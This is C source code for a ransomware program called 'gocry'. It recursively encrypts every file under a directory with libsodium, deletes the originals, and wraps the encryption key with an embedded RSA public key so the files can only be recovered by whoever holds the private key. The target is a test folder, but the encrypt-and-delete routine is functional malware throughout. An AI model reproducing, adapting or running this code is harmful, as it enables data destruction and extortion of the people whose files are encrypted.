#include <arpa/inet.h>
#include <dirent.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/ossl_typ.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <sodium.h>
#include <sodium/crypto_secretbox_xchacha20poly1305.h>
#include <sodium/crypto_secretstream_xchacha20poly1305.h>
#include <sodium/utils.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>

#define CHUNK_SIZE  4096
#define RSA_KEY_LEN 2048

char *root_dir_path = "./test_dir";
const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";

/* Embedded file: public-key.pem */
const int fsize = 625;
const unsigned char file[625] = {
    0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x42, 0x45, 0x47, 0x49, 0x4e, 0x20, 0x50, 0x55, 0x42, 0x4c, 0x49, 0x43,
    0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a, 0x4d, 0x49, 0x49, 0x42, 0x6f, 0x6a, 0x41,
    0x4e, 0x42, 0x67, 0x6b, 0x71, 0x68, 0x6b, 0x69, 0x47, 0x39, 0x77, 0x30, 0x42, 0x41, 0x51, 0x45, 0x46,
    0x41, 0x41, 0x4f, 0x43, 0x41, 0x59, 0x38, 0x41, 0x4d, 0x49, 0x49, 0x42, 0x69, 0x67, 0x4b, 0x43, 0x41,
    0x59, 0x45, 0x41, 0x75, 0x74, 0x6b, 0x50, 0x61, 0x39, 0x51, 0x58, 0x37, 0x73, 0x69, 0x4a, 0x63, 0x47,
    0x6f, 0x7a, 0x4d, 0x65, 0x36, 0x5a, 0x0a, 0x54, 0x52, 0x53, 0x4a, 0x6d, 0x54, 0x32, 0x47, 0x74, 0x33,
    0x73, 0x39, 0x61, 0x5a, 0x38, 0x56, 0x69, 0x4e, 0x37, 0x30, 0x69, 0x46, 0x5a, 0x35, 0x71, 0x50, 0x31,
    0x50, 0x71, 0x6d, 0x6f, 0x51, 0x74, 0x30, 0x44, 0x52, 0x57, 0x71, 0x7a, 0x69, 0x77, 0x57, 0x68, 0x31,
    0x5a, 0x45, 0x6f, 0x64, 0x71, 0x34, 0x49, 0x62, 0x47, 0x38, 0x7a, 0x6b, 0x38, 0x64, 0x48, 0x61, 0x6e,
    0x65, 0x68, 0x77, 0x0a, 0x41, 0x52, 0x62, 0x53, 0x4c, 0x69, 0x75, 0x68, 0x6b, 0x63, 0x51, 0x62, 0x77,
    0x4c, 0x50, 0x4c, 0x41, 0x4e, 0x2f, 0x68, 0x4b, 0x38, 0x34, 0x67, 0x39, 0x6d, 0x74, 0x62, 0x5a, 0x41,
    0x61, 0x66, 0x77, 0x71, 0x4c, 0x52, 0x36, 0x76, 0x44, 0x4c, 0x4e, 0x4a, 0x55, 0x30, 0x66, 0x73, 0x63,
    0x5a, 0x39, 0x64, 0x37, 0x6b, 0x55, 0x35, 0x51, 0x33, 0x4a, 0x46, 0x61, 0x32, 0x59, 0x50, 0x49, 0x6c,
    0x0a, 0x62, 0x50, 0x4d, 0x37, 0x71, 0x75, 0x68, 0x6f, 0x38, 0x4e, 0x51, 0x72, 0x64, 0x4a, 0x47, 0x37,
    0x43, 0x4f, 0x37, 0x59, 0x34, 0x69, 0x64, 0x65, 0x6a, 0x67, 0x47, 0x36, 0x6e, 0x4f, 0x71, 0x41, 0x49,
    0x6a, 0x30, 0x71, 0x4f, 0x68, 0x39, 0x54, 0x66, 0x78, 0x62, 0x52, 0x46, 0x54, 0x70, 0x78, 0x67, 0x63,
    0x68, 0x55, 0x74, 0x53, 0x4a, 0x78, 0x41, 0x4d, 0x7a, 0x33, 0x45, 0x6b, 0x59, 0x58, 0x0a, 0x55, 0x63,
    0x64, 0x57, 0x77, 0x67, 0x59, 0x73, 0x2f, 0x39, 0x2f, 0x64, 0x45, 0x46, 0x6a, 0x43, 0x57, 0x53, 0x59,
    0x2b, 0x6a, 0x65, 0x52, 0x41, 0x77, 0x6f, 0x57, 0x4a, 0x4a, 0x43, 0x2f, 0x6f, 0x41, 0x70, 0x4f, 0x4c,
    0x66, 0x45, 0x35, 0x77, 0x72, 0x47, 0x78, 0x31, 0x78, 0x64, 0x74, 0x6b, 0x5a, 0x4f, 0x43, 0x57, 0x76,
    0x66, 0x5a, 0x4d, 0x6f, 0x70, 0x48, 0x35, 0x70, 0x56, 0x75, 0x56, 0x0a, 0x7a, 0x6d, 0x61, 0x66, 0x66,
    0x4c, 0x6c, 0x61, 0x32, 0x48, 0x45, 0x76, 0x36, 0x59, 0x41, 0x36, 0x56, 0x59, 0x71, 0x79, 0x75, 0x4a,
    0x6d, 0x61, 0x38, 0x49, 0x64, 0x64, 0x69, 0x4b, 0x34, 0x65, 0x56, 0x58, 0x56, 0x75, 0x4a, 0x44, 0x68,
    0x35, 0x58, 0x4e, 0x50, 0x6a, 0x71, 0x70, 0x32, 0x41, 0x67, 0x76, 0x2f, 0x59, 0x66, 0x35, 0x55, 0x34,
    0x76, 0x64, 0x52, 0x59, 0x79, 0x33, 0x46, 0x2b, 0x0a, 0x48, 0x63, 0x79, 0x61, 0x35, 0x44, 0x58, 0x44,
    0x48, 0x31, 0x65, 0x67, 0x61, 0x58, 0x63, 0x59, 0x66, 0x4d, 0x70, 0x53, 0x54, 0x6e, 0x33, 0x6d, 0x78,
    0x73, 0x6d, 0x41, 0x48, 0x37, 0x54, 0x39, 0x57, 0x66, 0x6d, 0x61, 0x72, 0x6c, 0x79, 0x71, 0x69, 0x79,
    0x36, 0x6c, 0x37, 0x62, 0x6d, 0x47, 0x65, 0x42, 0x55, 0x68, 0x61, 0x35, 0x47, 0x6e, 0x31, 0x76, 0x41,
    0x4a, 0x4f, 0x38, 0x78, 0x36, 0x0a, 0x39, 0x35, 0x37, 0x63, 0x34, 0x2b, 0x47, 0x6f, 0x34, 0x46, 0x55,
    0x4b, 0x78, 0x79, 0x45, 0x66, 0x68, 0x4d, 0x54, 0x58, 0x6a, 0x50, 0x54, 0x69, 0x6b, 0x44, 0x5a, 0x61,
    0x75, 0x4e, 0x78, 0x5a, 0x49, 0x72, 0x6f, 0x56, 0x42, 0x69, 0x42, 0x31, 0x65, 0x68, 0x33, 0x42, 0x37,
    0x46, 0x4c, 0x54, 0x39, 0x4f, 0x75, 0x62, 0x37, 0x4f, 0x45, 0x4f, 0x44, 0x4b, 0x48, 0x4c, 0x6c, 0x50,
    0x6e, 0x37, 0x0a, 0x6a, 0x56, 0x33, 0x6b, 0x78, 0x4e, 0x51, 0x42, 0x68, 0x4a, 0x46, 0x66, 0x52, 0x6d,
    0x55, 0x55, 0x44, 0x2b, 0x50, 0x35, 0x4c, 0x36, 0x4b, 0x4a, 0x42, 0x63, 0x2f, 0x4b, 0x59, 0x49, 0x37,
    0x61, 0x33, 0x6c, 0x6c, 0x73, 0x41, 0x2b, 0x6c, 0x4a, 0x64, 0x37, 0x6b, 0x78, 0x41, 0x67, 0x4d, 0x42,
    0x41, 0x41, 0x45, 0x3d, 0x0a, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x45, 0x4e, 0x44, 0x20, 0x50, 0x55, 0x42,
    0x4c, 0x49, 0x43, 0x20, 0x4b, 0x45, 0x59, 0x2d, 0x2d, 0x2d, 0x2d, 0x2d, 0x0a};

static int encrypt(const char *encrypt_to, const char *source_file,
                   const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
    unsigned char buffer_in[CHUNK_SIZE];
    unsigned char buffer_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    FILE *fp_t, *fp_s;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    fp_s = fopen(source_file, "rb");
    fp_t = fopen(encrypt_to, "wb");
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key);
    fwrite(header, 1, sizeof header, fp_t);
    do {
        rlen = fread(buffer_in, 1, sizeof buffer_in, fp_s);
        eof = feof(fp_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        crypto_secretstream_xchacha20poly1305_push(&st, buffer_out, &out_len, buffer_in, rlen, NULL, 0, tag);
        fwrite(buffer_out, 1, (size_t)out_len, fp_t);
    } while (!eof);

    fclose(fp_t);
    fclose(fp_s);
    return 0;
}

int check_extension(const char *str, const char *suffix) {
    if (!str || !suffix)
        return 0;
    size_t lenstr = strlen(str);
    size_t lensuffix = strlen(suffix);
    if (lensuffix > lenstr)
        return 0;
    return strncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

unsigned char enc_key[crypto_secretbox_xchacha20poly1305_KEYBYTES];
void encryptRecursively(char *basePath) {
    char path[4096];
    struct dirent *dp;
    DIR *dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir) {
        char filename[256] = {0};
        snprintf(filename, 255, "%s.ccry", basePath);

        if (check_extension(basePath, ".ccry")) {
            return;
        }

        printf("encrypting %s\n", basePath);
        if (encrypt(filename, basePath, enc_key) != 0)
            printf("Error encrypting file %s", enc_key);

        // after the file has been ecrypted delete it.
        int r = remove(basePath);
        if (r != 0) {
            printf("error deleting file after encryption\n");
        }
        return;
    } else {
        while ((dp = readdir(dir)) != NULL) {
            if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0) {
                char filename[256] = {0};
                strcpy(path, basePath);
                strcat(path, "/");
                strcat(path, dp->d_name);
                encryptRecursively(path);
            }
        }
    }

    closedir(dir);
}

int main(void) {
    if (sodium_init() < 0)
        exit(EXIT_FAILURE);

    crypto_secretstream_xchacha20poly1305_keygen(enc_key);
    encryptRecursively(root_dir_path);

    EVP_PKEY *pkey;
    BIO *pubkey_bio = BIO_new_mem_buf(file, fsize);
    pkey = PEM_read_bio_PUBKEY(pubkey_bio, NULL, NULL, NULL);
    BIO_free(pubkey_bio);
    if (pkey == NULL) {
        exit(EXIT_FAILURE);
    }

    RSA *rsa = EVP_PKEY_get1_RSA(pkey);
    if (rsa == NULL) {
        exit(EXIT_FAILURE);
    }

    char *encrypted_key = (char *)malloc(RSA_size(rsa));
    int len;
    if ((len = RSA_public_encrypt(strlen((const char *)enc_key) + 1, (unsigned char *)enc_key,
                                  (unsigned char *)encrypted_key, rsa, RSA_PKCS1_OAEP_PADDING)) == -1) {
        printf("error encrypting keys");
        return 1;
    }

    sodium_memzero(&enc_key, crypto_secretbox_xchacha20poly1305_KEYBYTES);
    FILE *out = fopen("./key.txt", "w");
    fwrite(encrypted_key, sizeof(*encrypted_key), RSA_size(rsa), out);
    fclose(out);
    free(encrypted_key);
    return EXIT_SUCCESS;
}
